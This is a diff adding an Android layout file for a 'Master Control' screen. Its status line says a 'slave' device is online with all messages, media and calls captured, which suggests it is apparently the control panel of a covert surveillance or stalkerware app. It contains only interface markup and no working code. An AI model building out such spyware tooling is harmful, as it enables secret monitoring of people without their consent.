@@ -1,0 +1,12 @@
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent" android:layout_height="match_parent"
+    android:orientation="vertical" android:background="#0a0e15" android:padding="10dp">
+    <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
+        android:text="Master Control" android:textColor="#f59e0b" android:textSize="20sp"
+        android:textStyle="bold" android:layout_marginBottom="8dp"/>
+    <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
+        android:text="Slave online · all messages, media, calls captured" android:textColor="#8a97a8"
+        android:textSize="12sp" android:layout_marginBottom="8dp"/>
+    <ListView android:id="@+id/list" android:layout_width="match_parent"
+        android:layout_height="match_parent" android:background="#141b26"/>
+</LinearLayout>
